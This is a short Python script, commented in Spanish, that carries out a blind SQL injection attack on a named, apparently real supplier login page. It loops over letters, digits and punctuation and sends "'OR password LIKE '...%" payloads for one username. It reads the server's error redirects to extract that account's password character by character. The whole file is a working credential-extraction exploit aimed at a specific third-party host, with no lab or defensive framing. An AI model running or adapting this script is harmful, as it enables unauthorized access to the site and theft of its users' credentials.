# -*- coding: utf-8 -*-
import string
import requests
import time


SMayusculas=string.ascii_uppercase	#Asigna los valores de las letras mayusculas
SMinusculas=string.ascii_lowercase	#Asigna los valores de las letras minusculas
SNumeros=string.digits				#Asigna los valores de los digitos (numeros)
SCareacteres=string.punctuation		#Asigna los valores de los caracteres especiales

TotalString=SMinusculas+SMayusculas+SNumeros+SCareacteres
clave=''
Clavefinal=''
dato_send=''
cont=0

cantidad_caracteres=9

while cont < int(cantidad_caracteres):

    cont=cont+1
    print('Contador: %s' %cont)
    print('-'*30)
    for caracter1 in TotalString:
        #time.sleep(10)    
        clave=Clavefinal+caracter1
        #print('\'OR password LIKE \'%s%s\n' % (clave,chr(37)))
        dato_send='\'OR password LIKE \'' + clave+'%'
        #print('-----------<<')
        #print(dato_send)
             
       
        data ={
                    'username': '013',
                    'password': dato_send
              }
                
        Respuesta_web=requests.post('http://caderproveedores.dyndns.org/login1.asp', data = data)
        print('+'*30) 
        
        Pagina=Respuesta_web.text
        #print(Pagina)

        if 'error.asp' in Pagina:
            if 'error.asp?cod=NPROD' in Pagina:
                print('Este es un caracter valido') 
                Clavefinal=Clavefinal+caracter1
                print("-----> Este es el caracter almacenado: %s" % Clavefinal)
                break
            pass
        
        else:
            
            print('Este es un caracter valido') 
            Clavefinal=Clavefinal+caracter1
            print("-----> Este es el caracter almacenado: %s" % Clavefinal)
            
            break
    


print("------->> Clave final: %s" % Clavefinal)
print("")







